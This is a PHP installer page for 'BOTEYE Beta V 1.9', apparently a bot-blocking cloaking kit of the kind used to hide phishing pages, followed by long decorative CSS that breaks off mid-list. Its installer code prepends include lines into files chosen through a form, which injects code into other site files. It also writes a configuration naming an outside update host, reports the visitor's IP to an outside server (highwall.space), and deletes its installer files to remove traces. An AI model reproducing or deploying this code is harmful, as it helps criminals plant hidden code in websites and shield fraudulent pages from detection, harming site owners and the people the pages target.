<?php
session_start();
error_reporting(0);


// made by Cyborg99" // https://icq.im/ra__3 "N3V3R D0WN HQ"
$next = $_GET['next'];
$folks = $_GET['folks'];
function deleteAll($str) {
    if (is_file($str)) {
        return unlink($str);
    }
    elseif (is_dir($str)) {
    $scan = glob(rtrim($str,'/').'/*');
    foreach($scan as $index=>$path) {
    deleteAll($path);
    }
    return @rmdir($str);
    }
}
function getitnow($smallajar,$saker) {
$sar = substr_count($smallajar, '/'); 
if (strpos($sar, '1') !== false) {
$jar = '..';
}else if(strpos($sar, '2') !== false) {
$jar = '../..';	
}else if(strpos($sar, '3') !== false) {
$jar = '../../..';	
}else if(strpos($sar, '4') !== false) {
$jar = '../../../..';	
}else if(strpos($sar, '5') !== false) {
$jar = '../../../../..';	
}else{
exit(MOJODOJOJO);
}



$file = $smallajar;
$oldContents = file_get_contents($file);
$fr = fopen($file, 'w');
fwrite($fr, "<?php include_once'$jar/$saker.php';?>");
fwrite($fr, $oldContents);
fclose($fr);
}




if(isset($_POST['chk'])) 
{
$soker=rand(0000000, 9999999);
$sokera=rand(0000000, 9999999);
$saker=md5($soker);
$sakera=md5($sokera);
rename ("inline.php", "$sakera.php");
rename("proxy.php", "$saker.php");
$dataString = 
"inco='".$sakera."'\r\n".
"inca='".$saker."'";
$fWrite = fopen("install.ini",'w+');
$wrote = fwrite($fWrite, $dataString);
fclose($fWrite);


$str = $_POST["chk"];
foreach ($_POST['chk'] as $key => $value) {
getitnow($value,$saker);
}
}
?>

<?php
function getChak($len = 10) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rine=rand(000000, 9999999);
$rine = sha1($rine);
$email=$_POST['email'];
$nato=getChak(8);
$cato=getChak(8);
$email=$_POST['email'];
$apikey=$_POST['apikey'];
$diro=$_POST['dirnes'];
$faker=$_POST['faker'];
$colr=$_POST['color'];
$mho=$_POST['hook'];
$lek=$_POST['lock'];
$tex=$_POST['textex'];
$cot=$_POST['country'];
$cot = strtoupper($cot);

$dataString = 
"reportmail='".$email."'\r\n".
"namer='".$nato."'\r\n".
"naemv='".$cato."'\r\n".
"update='http://highwall.space'\r\n".
"dirnam='".$diro."'\r\n".
"faker='".$faker."'\r\n".
"color='".$colr."'\r\n".
"mhook='".$mho."'\r\n".
"countlock='".$lek."'\r\n".
"countreg='".$cot."'\r\n".
"button='".$tex."'\r\n".
"apikey='".$apikey."'";
if (isset($_POST['email'])) {
$fWrite = fopen("config-".$rine.".ini",'w+');
$wrote = fwrite($fWrite, $dataString);
fclose($fWrite);
//-*-*-*******************-*-*--**--*-*-*-*-*-*------*-*-*-*
$insy = parse_ini_file("install.ini", true);
$getdir=$insy['inca'];
$getdiro=$insy['inco'];

$oldMes= 'inline';
$delez = "$getdiro";

$str=file_get_contents(''.$getdiro.'.php');
$str=str_replace($oldMes, $delez,$str);
file_put_contents(''.$getdiro.'.php', $str);
//
$oldMessage = 'proxy';
$deletedFormat = "config-$rine";
$strq=file_get_contents(''.$getdiro.'.php');
$strq=str_replace($oldMessage, $deletedFormat,$strq);
file_put_contents(''.$getdiro.'.php', $strq);
//
$regt=file_get_contents('index.php');
$regt=str_replace($oldMessage, $deletedFormat,$regt);
file_put_contents('index.php', $regt);
//
$olage = 'inline.php';
$deormat = "".$getdiro.".php";
$regti=file_get_contents('index.php');
$regti=str_replace($olage, $deormat,$regti);
file_put_contents('index.php', $regti);
//
$guce=file_get_contents(''.$getdir.'.php');
$guce=str_replace($oldMessage, $deletedFormat,$guce);
file_put_contents(''.$getdir.'.php', $guce);
//-*-*--*-*-*--*-*-*--*-*-*--*-*-*--*-*-*--*-*-*--*-*-*--*
function getzip() {
	    foreach (array('HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','HTTP_X_FORWARDED','HTTP_X_CLUSTER_CLIENT_IP','HTTP_FORWARDED_FOR','HTTP_FORWARDED','REMOTE_ADDR') as $key)
	   	{
	       if (array_key_exists($key, $_SERVER) === true)
	       {
	            foreach (explode(',', $_SERVER[$key]) as $ipgrassjoss){
	                $ipgrassjoss = trim($ipgrassjoss);
	                if (filter_var($ipgrassjoss,FILTER_VALIDATE_IP,FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)!== false) 
	                {
	                   return $ipgrassjoss;
	                }
	            }
	        }
	    }
	}
	
$ipz=getzip();
$url = "http://highwall.space/check/auth.php?auth=$ipz";
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_URL, $url);
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
   curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
   $result = curl_exec($curl);
   curl_close($curl);
//-*-*--*-*-*--*-*-*--*-*-*--*-*-*--*-*-*--*-*-*--*-*-*--*

deleteAll('botadmin.php');
deleteAll('install.ini');
echo '<script>window.location.href = "index.php";</script>';

}

?>


<!DOCTYPE html>
<head>
<meta charset="UTF-8">
<link rel="shortcut icon" type="image/x-icon" href="https://png.pngtree.com/png-vector/20190327/ourmid/pngtree-five-eye-alliance-spy-vector-illustration-png-image_877372.jpg" />
<title>BOTEYE Beta V 1.9 ~ SCRIPT PROTECTION</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.form/4.2.2/jquery.form.js"></script> 
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.6-rc.0/css/select2.min.css" rel="stylesheet" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/select2/4.0.6-rc.0/js/select2.min.js"></script>
<script src='https://cdn.jsdelivr.net/npm/sweetalert2'></script>
<link href="https://fonts.googleapis.com/css?family=Exo+2&display=swap" rel="stylesheet">
<script src='https://cdnjs.cloudflare.com/ajax/libs/vue/2.3.4/vue.min.js'></script>
<script src='https://unpkg.com/vue-color/dist/vue-color.min.js'></script>



<script>
function madada() {
setTimeout(
function() {
var url = location.href;
var urlParts = url.split('?');
var params = new URLSearchParams(urlParts[1]);
params.delete('folks');
var newUrl = urlParts[0] + '?' + params.toString()
window.location = newUrl+"&next=XqGbXYG6IM611fAP_ZKhkAQ"
    }, 2000);
}
</script>

<script> 
$(document).ready(function() { 
$('#yonoform').ajaxForm(function() { 
Swal.fire(
  'Good job!',
  'Installed Successfully!',
  'success'
)
madada();
            }); 
        }); 
</script> 
	
	
<style>
body, div, dl, dt, dd, ul, ol, li, h1, h2, h3, h4, h5, h6, 
pre, form, fieldset, input, textarea, p, blockquote, th, td { 
  padding:0;
  margin:0;}

fieldset, img {border:0}

ol, ul, li {list-style:none}

:focus {outline:none}

body,
input,
textarea,
select {
  font-family: 'Exo 2', sans-serif;
  font-size: 14px;
  color: #4c4c4c;
}

p {
  font-size: 15px;
  width: 273px;
  display: inline-block;
  margin-left: 18px;
}
h1 {
  font-size: 32px;
  font-weight: 300;
  color: #4c4c4c;
  text-align: center;
  padding-top: 10px;
  margin-bottom: 10px;
}



.testbox {
  margin: auto auto;
  width: 354px; 
  -webkit-border-radius: 8px/7px; 
  -moz-border-radius: 8px/7px; 
  border-radius: 8px/7px; 
  background-color: #423d3d; 
  height: 100%;
  min-height: 1300px;
}

p {
 color: #fff;
}
li {
 color: #fff;
}
h4 {
 color: #fff;
}
h6 {
 color: #fff;
}
input[type=radio] {
  visibility: hidden;
}

form{
  margin: 8px 46px;
}

label.radio {
	cursor: pointer;
  text-indent: 35px;
  overflow: visible;
  display: inline-block;
  position: relative;
  margin-bottom: 15px;
}

label.radio:before {
  background: #3a57af;
  content:'';
  position: absolute;
  top:2px;
  left: 0;
  width: 20px;
  height: 20px;
  border-radius: 100%;
}

label.radio:after {
	opacity: 0;
	content: '';
	position: absolute;
	width: 0.5em;
	height: 0.25em;
	background: transparent;
	top: 7.5px;
	left: 4.5px;
	border: 3px solid #ffffff;
	border-top: none;
	border-right: none;

	-webkit-transform: rotate(-45deg);
	-moz-transform: rotate(-45deg);
	-o-transform: rotate(-45deg);
	-ms-transform: rotate(-45deg);
	transform: rotate(-45deg);
}

input[type=radio]:checked + label:after {
	opacity: 1;
}

hr{
  color: #a9a9a9;
  opacity: 0.3;
}

input[type=text],input[type=password]{
  width: 200px; 
  height: 36px; 
  -webkit-border-radius: 0px 4px 4px 0px/5px 5px 4px 4px; 
  -moz-border-radius: 0px 4px 4px 0px/0px 0px 4px 4px; 
  border-radius: 0px 4px 4px 0px/5px 5px 4px 4px; 
  background-color: #fff; 
  -webkit-box-shadow: 1px 2px 5px rgba(0,0,0,.09); 
  -moz-box-shadow: 1px 2px 5px rgba(0,0,0,.09); 
  box-shadow: 1px 2px 5px rgba(0,0,0,.09); 
  border: solid 1px #cbc9c9;
  margin-left: -5px;
  margin-top: 13px; 
  padding-left: 10px;
}

input[type=password]{
  margin-bottom: 25px;
}

#icon {
  display: inline-block;
  width: 41px;
  background-color: #40b70a;
  padding: 8px 0px 8px 15px;
  margin-left: 15px;
  -webkit-border-radius: 4px 0px 0px 4px; 
  -moz-border-radius: 4px 0px 0px 4px; 
  border-radius: 4px 0px 0px 4px;
  color: white;
  -webkit-box-shadow: 1px 2px 5px rgba(0,0,0,.09);
  -moz-box-shadow: 1px 2px 5px rgba(0,0,0,.09); 
  box-shadow: 6px 5px 0px rgba(0, 0, 0, 0.14);
  border: solid 0px #cbc9c9;
}

.gender {
  margin-left: 30px;
  margin-bottom: 30px;
}

.accounttype{
  margin-left: 8px;
  margin-top: 20px;
}

a.button {
  font-size: 27px;
  font-weight: 600;
  color: white;
  padding: 6px 25px 0px 20px;
  display: inline-block;
  float: right;
  text-decoration: none;
  width: 267px; height: 53px; 
  -webkit-border-radius: 5px; 
  -moz-border-radius: 5px; 
  border-radius: 5px; 
  background-color: #14b35f; 
  transition: all 0.1s linear 0s; 
  top: 0px;
  position: relative;
  TEXT-ALIGN: center;
}

a.button:hover {
  top: 3px;
  background-color:#40b70a;
  -webkit-box-shadow: none; 
  -moz-box-shadow: none; 
  box-shadow: none;
  
}

body {
  margin: 2rempx 0px;
  
  h6 {
    margin-top: 2rem;  
  }
}
hr.colas {
border-top: 1px solid #ffffff;
}
  </style>
<script>
  window.console = window.console || function(t) {};
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prefixfree/1.0.7/prefixfree.min.js"></script>
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
</script>
</head>
<body translate="no">
<link href="//netdna.bootstrapcdn.com/font-awesome/3.1.1/css/font-awesome.css" rel="stylesheet">

<style>
   body {

  background: radial-gradient(ellipse at bottom, #0071f5 0%, #090a0f 100%);
}

#stars {
  width: 1px;
  height: 1px;
  background: transparent;
  box-shadow: 1761px 664px #FFF , 882px 400px #FFF , 177px 1286px #FFF , 845px 754px #FFF , 653px 457px #FFF , 1383px 1288px #FFF , 776px 199px #FFF , 1832px 569px #FFF , 276px 672px #FFF , 1000px 625px #FFF , 319px 1105px #FFF , 1413px 1580px #FFF , 418px 673px #FFF , 1194px 1259px #FFF , 485px 1822px #FFF , 1778px 451px #FFF , 225px 1229px #FFF , 1867px 1215px #FFF , 497px 1382px #FFF , 637px 566px #FFF , 229px 1459px #FFF , 1644px 504px #FFF , 259px 80px #FFF , 1432px 74px #FFF , 472px 604px #FFF , 990px 868px #FFF , 1431px 1382px #FFF , 840px 1326px #FFF , 162px 263px #FFF , 868px 540px #FFF , 1095px 314px #FFF , 662px 1942px #FFF , 444px 995px #FFF , 1810px 750px #FFF , 875px 1518px #FFF , 273px 1237px #FFF , 1409px 618px #FFF , 611px 23px #FFF , 894px 182px #FFF , 945px 1929px #FFF , 1117px 1872px #FFF , 1634px 1289px #FFF , 615px 955px #FFF , 262px 1829px #FFF , 10px 599px #FFF , 1822px 1077px #FFF , 435px 1831px #FFF , 1989px 642px #FFF , 1452px 1139px #FFF , 331px 1234px #FFF , 1154px 1529px #FFF , 1849px 1119px #FFF , 1840px 231px #FFF , 400px 1747px #FFF , 1404px 1492px #FFF , 1202px 155px #FFF , 1099px 1477px #FFF , 825px 1989px #FFF , 264px 1801px #FFF , 826px 817px #FFF , 572px 1921px #FFF , 756px 670px #FFF , 1217px 1540px #FFF , 1394px 495px #FFF , 1033px 1229px #FFF , 700px 920px #FFF , 1843px 1138px #FFF , 938px 1700px #FFF , 1721px 1310px #FFF , 449px 1259px #FFF , 249px 472px #FFF , 1518px 1387px #FFF , 25px 1395px #FFF , 1180px 241px #FFF , 645px 1598px #FFF , 1506px 973px #FFF , 468px 1112px #FFF , 1760px 1913px #FFF , 142px 914px #FFF , 1868px 81px #FFF , 460px 405px #FFF , 12px 1932px #FFF , 1601px 1872px #FFF , 1063px 587px #FFF , 1757px 1982px #FFF , 542px 1341px #FFF , 1980px 100px #FFF , 210px 786px #FFF , 101px 793px #FFF , 16px 1556px #FFF , 1628px 1538px #FFF , 1897px 70px #FFF , 1308px 68px #FFF , 1850px 1269px #FFF , 307px 704px #FFF , 1812px 1113px #FFF , 410px 912px #FFF , 126px 549px #FFF , 1373px 422px #FFF , 1371px 1189px #FFF , 935px 1355px #FFF , 1508px 631px #FFF , 418px 1168px #FFF , 295px 1288px #FFF , 188px 512px #FFF , 1906px 777px #FFF , 1998px 835px #FFF , 1310px 1128px #FFF , 702px 1259px #FFF , 1959px 220px #FFF , 718px 17px #FFF , 85px 403px #FFF , 1848px 1575px #FFF , 1961px 178px #FFF , 590px 1459px #FFF , 1198px 494px #FFF , 152px 1488px #FFF , 1195px 313px #FFF , 858px 708px #FFF , 1727px 944px #FFF , 1565px 720px #FFF , 697px 609px #FFF , 1001px 1305px #FFF , 1589px 200px #FFF , 1131px 1453px #FFF , 1920px 356px #FFF , 1636px 1593px #FFF , 243px 1651px #FFF , 1661px 989px #FFF , 1705px 292px #FFF , 95px 1790px #FFF , 1751px 1848px #FFF , 1411px 1768px #FFF , 110px 88px #FFF , 1528px 1645px #FFF , 1354px 912px #FFF , 1029px 913px #FFF , 1705px 782px #FFF , 1355px 574px #FFF , 919px 1248px #FFF , 1317px 618px #FFF , 1179px 921px #FFF , 434px 159px #FFF , 1669px 621px #FFF , 159px 619px #FFF , 456px 1567px #FFF , 862px 1925px #FFF , 836px 305px #FFF , 413px 1051px #FFF , 1226px 1404px #FFF , 1953px 1256px #FFF , 1342px 1926px #FFF , 427px 301px #FFF , 451px 830px #FFF , 7px 1071px #FFF , 626px 1084px #FFF , 1425px 9px #FFF , 106px 1681px #FFF , 280px 354px #FFF , 125px 833px #FFF , 1271px 275px #FFF , 1400px 1793px #FFF , 689px 1899px #FFF , 1554px 919px #FFF , 547px 232px #FFF , 588px 1672px #FFF , 1057px 739px #FFF , 1048px 357px #FFF , 393px 702px #FFF , 414px 1232px #FFF , 464px 1891px #FFF , 1866px 1934px #FFF , 564px 990px #FFF , 866px 953px #FFF , 1277px 1928px #FFF , 1680px 1596px #FFF , 745px 603px #FFF , 1654px 1625px #FFF , 32px 1250px #FFF , 710px 839px #FFF , 1996px 1870px #FFF , 1799px 203px #FFF , 111px 772px #FFF , 1078px 2px #FFF , 1178px 1290px #FFF , 1961px 166px #FFF , 972px 694px #FFF , 680px 339px #FFF , 721px 988px #FFF , 1390px 1726px #FFF , 239px 598px #FFF , 1665px 638px #FFF , 280px 487px #FFF , 41px 39px #FFF , 904px 1149px #FFF , 537px 1699px #FFF , 1714px 847px #FFF , 1719px 1145px #FFF , 1669px 336px #FFF , 1742px 1667px #FFF , 1380px 509px #FFF , 1109px 177px #FFF , 837px 1835px #FFF , 1059px 1769px #FFF , 115px 1387px #FFF , 1910px 1036px #FFF , 814px 1452px #FFF , 1817px 478px #FFF , 1573px 554px #FFF , 443px 1953px #FFF , 1469px 909px #FFF , 1412px 1059px #FFF , 856px 1230px #FFF , 1935px 1205px #FFF , 449px 437px #FFF , 68px 1541px #FFF , 255px 501px #FFF , 915px 936px #FFF , 985px 354px #FFF , 1575px 1651px #FFF , 547px 441px #FFF , 1572px 1725px #FFF , 1322px 1070px #FFF , 116px 1682px #FFF , 1492px 1087px #FFF , 1846px 160px #FFF , 1141px 1739px #FFF , 178px 1177px #FFF , 548px 939px #FFF , 86px 1194px #FFF , 1815px 824px #FFF , 597px 1268px #FFF , 772px 784px #FFF , 136px 1897px #FFF , 226px 460px #FFF , 368px 1376px #FFF , 1174px 816px #FFF , 1902px 461px #FFF , 1306px 961px #FFF , 1057px 87px #FFF , 1705px 1034px #FFF , 1110px 1777px #FFF , 988px 1192px #FFF , 1260px 6px #FFF , 552px 814px #FFF , 386px 1543px #FFF , 698px 1002px #FFF , 1398px 240px #FFF , 1350px 102px #FFF , 1897px 918px #FFF , 1514px 1609px #FFF , 1396px 452px #FFF , 1986px 1440px #FFF , 1432px 1467px #FFF , 321px 1643px #FFF , 1294px 426px #FFF , 1133px 99px #FFF , 238px 1519px #FFF , 1109px 365px #FFF , 1072px 718px #FFF , 1581px 1971px #FFF , 1525px 1614px #FFF , 824px 1730px #FFF , 757px 1353px #FFF , 1369px 208px #FFF , 360px 1139px #FFF , 1481px 853px #FFF , 272px 363px #FFF , 1722px 52px #FFF , 458px 1144px #FFF , 410px 480px #FFF , 911px 1703px #FFF , 348px 1945px #FFF , 375px 193px #FFF , 1514px 1142px #FFF , 435px 1033px #FFF , 1825px 1125px #FFF , 647px 1362px #FFF , 1437px 697px #FFF , 817px 987px #FFF , 178px 1133px #FFF , 755px 1368px #FFF , 357px 1931px #FFF , 1879px 1841px #FFF , 823px 287px #FFF , 1201px 1198px #FFF , 126px 1193px #FFF , 1093px 1719px #FFF , 115px 383px #FFF , 1434px 531px #FFF , 1503px 1562px #FFF , 512px 875px #FFF , 848px 1593px #FFF , 69px 44px #FFF , 276px 1237px #FFF , 436px 593px #FFF , 134px 1148px #FFF , 1650px 87px #FFF , 75px 1323px #FFF , 1828px 1936px #FFF , 164px 56px #FFF , 1794px 751px #FFF , 1594px 283px #FFF , 938px 20px #FFF , 479px 1644px #FFF , 1370px 1895px #FFF , 1066px 1424px #FFF , 571px 648px #FFF , 780px 1203px #FFF , 821px 131px #FFF , 929px 1219px #FFF , 1708px 1909px #FFF , 1019px 1349px #FFF , 97px 419px #FFF , 985px 1228px #FFF , 1255px 1904px #FFF , 1156px 166px #FFF , 1499px 1705px #FFF , 679px 255px #FFF , 1242px 808px #FFF , 619px 843px #FFF , 16px 1436px #FFF , 1460px 109px #FFF , 648px 224px #FFF , 133px 137px #FFF , 977px 94px #FFF , 1942px 1706px #FFF , 355px 1075px #FFF , 622px 1440px #FFF , 433px 1695px #FFF , 224px 1044px #FFF , 1878px 1271px #FFF , 901px 531px #FFF , 598px 1542px #FFF , 1707px 156px #FFF , 1733px 1351px #FFF , 503px 247px #FFF , 1614px 1988px #FFF , 289px 34px #FFF , 10px 808px #FFF , 1250px 245px #FFF , 253px 1604px #FFF , 1107px 1763px #FFF , 781px 362px #FFF , 433px 714px #FFF , 1507px 1341px #FFF , 1673px 1050px #FFF , 657px 1761px #FFF , 82px 88px #FFF , 1894px 1756px #FFF , 1325px 1880px #FFF , 1396px 1338px #FFF , 2px 1667px #FFF , 545px 189px #FFF , 1693px 267px #FFF , 497px 6px #FFF , 1857px 673px #FFF , 1926px 524px #FFF , 1565px 1886px #FFF , 239px 1803px #FFF , 290px 134px #FFF , 1374px 1294px #FFF , 1602px 440px #FFF , 1809px 1176px #FFF , 522px 978px #FFF , 964px 1669px #FFF , 592px 247px #FFF , 1865px 180px #FFF , 1751px 1205px #FFF , 1037px 1985px #FFF , 506px 444px #FFF , 1181px 1113px #FFF , 1388px 89px #FFF , 450px 1309px #FFF , 1773px 1944px #FFF , 390px 403px #FFF , 1425px 711px #FFF , 834px 372px #FFF , 1423px 233px #FFF , 241px 187px #FFF , 656px 1152px #FFF , 1427px 1982px #FFF , 261px 873px #FFF , 1190px 109px #FFF , 933px 242px #FFF , 1634px 376px #FFF , 1809px 1450px #FFF , 507px 1424px #FFF , 1277px 291px #FFF , 662px 1379px #FFF , 574px 1789px #FFF , 758px 1237px #FFF , 709px 1502px #FFF , 393px 791px #FFF , 1648px 1999px #FFF , 202px 672px #FFF , 215px 1257px #FFF , 1176px 1583px #FFF , 1706px 209px #FFF , 26px 73px #FFF , 778px 1782px #FFF , 1078px 769px #FFF , 1186px 1947px #FFF , 1690px 1636px #FFF , 1440px 104px #FFF , 1115px 576px #FFF , 642px 159px #FFF , 1432px 520px #FFF , 427px 1495px #FFF , 1831px 1051px #FFF , 1409px 136px #FFF , 85px 107px #FFF , 27px 1064px #FFF , 1057px 1250px #FFF , 1999px 243px #FFF , 627px 401px #FFF , 764px 1468px #FFF , 968px 1367px #FFF , 1781px 1089px #FFF , 1614px 1683px #FFF , 408px 962px #FFF , 1510px 748px #FFF , 385px 893px #FFF , 961px 1005px #FFF , 1987px 1824px #FFF , 1229px 1307px #FFF , 364px 142px #FFF , 1056px 774px #FFF , 1620px 504px #FFF , 235px 1732px #FFF , 1695px 875px #FFF , 334px 798px #FFF , 133px 1772px #FFF , 924px 1906px #FFF , 451px 1905px #FFF , 1039px 1645px #FFF , 133px 170px #FFF , 1359px 385px #FFF , 1681px 1516px #FFF , 1353px 1991px #FFF , 422px 435px #FFF , 357px 926px #FFF , 1684px 562px #FFF , 191px 76px #FFF , 306px 1729px #FFF , 687px 366px #FFF , 1810px 1757px #FFF , 861px 1143px #FFF , 1045px 323px #FFF , 1085px 1434px #FFF , 540px 1043px #FFF , 201px 214px #FFF , 1442px 311px #FFF , 397px 641px #FFF , 1708px 618px #FFF , 1580px 19px #FFF , 1668px 1111px #FFF , 698px 153px #FFF , 1603px 1788px #FFF , 716px 1657px #FFF , 587px 845px #FFF , 1026px 864px #FFF , 1885px 1012px #FFF , 425px 1852px #FFF , 679px 776px #FFF , 1914px 690px #FFF , 1021px 1373px #FFF , 1317px 1631px #FFF , 1558px 780px #FFF , 352px 1545px #FFF , 1033px 1797px #FFF , 1806px 1207px #FFF , 1513px 517px #FFF , 786px 517px #FFF , 19px 1684px #FFF , 308px 1468px #FFF , 1513px 527px #FFF , 259px 1104px #FFF , 1457px 1396px #FFF , 1350px 451px #FFF , 283px 271px #FFF , 456px 542px #FFF , 1013px 1894px #FFF , 1985px 580px #FFF , 1523px 105px #FFF , 1293px 230px #FFF , 1902px 89px #FFF , 841px 802px #FFF , 1247px 1258px #FFF , 1412px 497px #FFF , 1215px 1753px #FFF , 697px 419px #FFF , 348px 1915px #FFF , 269px 263px #FFF , 193px 951px #FFF , 1942px 797px #FFF , 1908px 1031px #FFF , 901px 1387px #FFF , 556px 1172px #FFF , 314px 240px #FFF , 412px 1525px #FFF , 1417px 1322px #FFF , 1459px 79px #FFF , 1221px 756px #FFF , 1114px 1525px #FFF , 797px 353px #FFF , 1786px 919px #FFF , 521px 1331px #FFF , 1553px 1278px #FFF , 230px 739px #FFF , 1497px 1213px #FFF , 816px 965px #FFF , 1996px 967px #FFF , 972px 473px #FFF , 424px 1660px #FFF , 1864px 1728px #FFF , 1384px 472px #FFF , 746px 1733px #FFF , 1963px 1056px #FFF , 1968px 650px #FFF , 1750px 789px #FFF , 828px 282px #FFF , 661px 999px #FFF , 375px 1822px #FFF , 1929px 1943px #FFF , 132px 1221px #FFF , 1282px 27px #FFF , 463px 806px #FFF , 420px 68px #FFF , 1071px 738px #FFF , 724px 739px #FFF , 781px 1195px #FFF , 1743px 541px #FFF , 1196px 49px #FFF , 1463px 640px #FFF , 1634px 566px #FFF , 950px 1678px #FFF , 1654px 1650px #FFF , 1941px 1232px #FFF , 1627px 543px #FFF , 148px 595px #FFF , 1472px 1487px #FFF , 1433px 1907px #FFF , 460px 694px #FFF , 672px 426px #FFF , 1737px 1347px #FFF , 605px 1940px #FFF , 434px 1732px #FFF , 399px 1787px #FFF , 1332px 285px #FFF , 1900px 929px #FFF , 1445px 963px #FFF , 1558px 821px #FFF , 1947px 348px #FFF , 1645px 1512px #FFF , 393px 1600px #FFF , 1006px 1282px #FFF , 1501px 1040px #FFF , 42px 1454px #FFF , 1865px 514px #FFF , 1621px 1746px #FFF , 288px 465px #FFF , 1718px 449px #FFF , 913px 1558px #FFF , 1549px 34px #FFF , 1728px 164px #FFF , 634px 1952px #FFF , 1858px 1992px #FFF , 765px 606px #FFF , 1487px 1432px #FFF , 1600px 341px #FFF , 1939px 759px #FFF , 1054px 622px #FFF , 241px 806px #FFF , 935px 107px #FFF , 1305px 179px #FFF , 540px 1573px #FFF , 367px 1950px #FFF , 759px 1130px #FFF , 393px 1444px #FFF , 984px 209px #FFF , 1622px 449px #FFF , 606px 1638px #FFF , 1846px 1125px #FFF , 498px 408px #FFF , 1795px 742px #FFF , 5px 1341px #FFF , 1402px 1634px #FFF , 707px 397px #FFF , 1372px 194px #FFF , 1945px 113px #FFF , 1097px 695px #FFF , 909px 479px #FFF , 1396px 349px #FFF , 1585px 1464px #FFF , 285px 665px #FFF , 1196px 1436px #FFF , 710px 807px #FFF , 1703px 1185px #FFF , 591px 637px #FFF , 1701px 1348px #FFF , 1922px 48px #FFF , 308px 1724px #FFF , 620px 1818px #FFF , 605px 1276px #FFF , 1972px 971px #FFF , 1703px 1828px #FFF , 724px 1416px #FFF , 1502px 1797px #FFF , 563px 613px #FFF , 1989px 19px #FFF , 1227px 1693px #FFF , 365px 1882px #FFF , 1977px 827px #FFF , 200px 724px #FFF , 1066px 533px #FFF , 1470px 1566px #FFF , 1695px 586px #FFF , 1423px 875px #FFF , 33px 832px #FFF , 607px 248px #FFF , 243px 1836px #FFF , 1622px 418px #FFF , 145px 689px #FFF , 1770px 1453px #FFF , 19px 196px #FFF , 752px 1909px #FFF , 401px 250px #FFF , 837px 941px #FFF , 1636px 327px #FFF , 83px 1953px #FFF , 151px 1684px #FFF , 780px 168px #FFF , 170px 1449px #FFF , 497px 1044px #FFF , 417px 1017px #FFF , 1047px 951px #FFF , 156px 834px #FFF , 1624px 725px #FFF , 750px 1945px #FFF , 1943px 406px #FFF , 1267px 592px #FFF , 1019px 487px #FFF , 216px 145px #FFF , 883px 1687px #FFF , 917px 694px #FFF , 804px 909px #FFF , 283px 1254px #FFF , 46px 1697px #FFF , 1616px 1177px #FFF , 871px 1466px #FFF , 1938px 906px #FFF , 1588px 1223px #FFF , 1094px 1461px #FFF , 1709px 1450px #FFF , 1194px 374px #FFF , 34px 1957px #FFF , 47px 878px #FFF , 591px 175px #FFF , 376px 1712px #FFF , 1163px 1635px #FFF , 869px 709px #FFF , 224px 314px #FFF , 1301px 194px #FFF , 628px 1329px #FFF , 784px 1699px #FFF , 1376px 180px #FFF , 1607px 1077px #FFF , 312px 714px #FFF , 913px 1772px #FFF , 422px 1645px #FFF , 1809px 1507px #FFF , 983px 109px #FFF , 50px 1703px #FFF , 1102px 1182px #FFF , 136px 1037px #FFF , 251px 1376px #FFF , 1283px 299px #FFF , 1540px 713px #FFF , 756px 1345px #FFF , 1012px 980px #FFF , 1785px 756px #FFF , 429px 439px #FFF , 1571px 763px #FFF , 390px 1160px #FFF , 1757px 1670px #FFF , 1592px 1877px #FFF , 1118px 728px #FFF , 690px 558px #FFF , 1705px 873px #FFF , 1355px 1029px #FFF , 494px 1008px #FFF , 785px 1415px #FFF , 1647px 1447px #FFF , 1392px 967px #FFF , 294px 1217px #FFF , 603px 1221px #FFF , 614px 1699px #FFF , 1056px 9px #FFF , 610px 1940px #FFF;
  animation: animStar 50s linear infinite;
}
#stars:after {
  content: " ";
  position: absolute;
  top: 200px;
  width: 1px;
  height: 1px;
  background: transparent;
  box-shadow: 1761px 664px #FFF , 882px 400px #FFF , 177px 1286px #FFF , 845px 754px #FFF , 653px 457px #FFF , 1383px 1288px #FFF , 776px 199px #FFF , 1832px 569px #FFF , 276px 672px #FFF , 1000px 625px #FFF , 319px 1105px #FFF , 1413px 1580px #FFF , 418px 673px #FFF , 1194px 1259px #FFF , 485px 1822px #FFF , 1778px 451px #FFF , 225px 1229px #FFF , 1867px 1215px #FFF , 497px 1382px #FFF , 637px 566px #FFF , 229px 1459px #FFF , 1644px 504px #FFF , 259px 80px #FFF , 1432px 74px #FFF , 472px 604px #FFF , 990px 868px #FFF , 1431px 1382px #FFF , 840px 1326px #FFF , 162px 263px #FFF , 868px 540px #FFF , 1095px 314px #FFF , 662px 1942px #FFF , 444px 995px #FFF , 1810px 750px #FFF , 875px 1518px #FFF , 273px 1237px #FFF , 1409px 618px #FFF , 611px 23px #FFF , 894px 182px #FFF , 945px 1929px #FFF , 1117px 1872px #FFF , 1634px 1289px #FFF , 615px 955px #FFF , 262px 1829px #FFF , 10px 599px #FFF , 1822px 1077px #FFF , 435px 1831px #FFF , 1989px 642px #FFF , 1452px 1139px #FFF , 331px 1234px #FFF , 1154px 1529px #FFF , 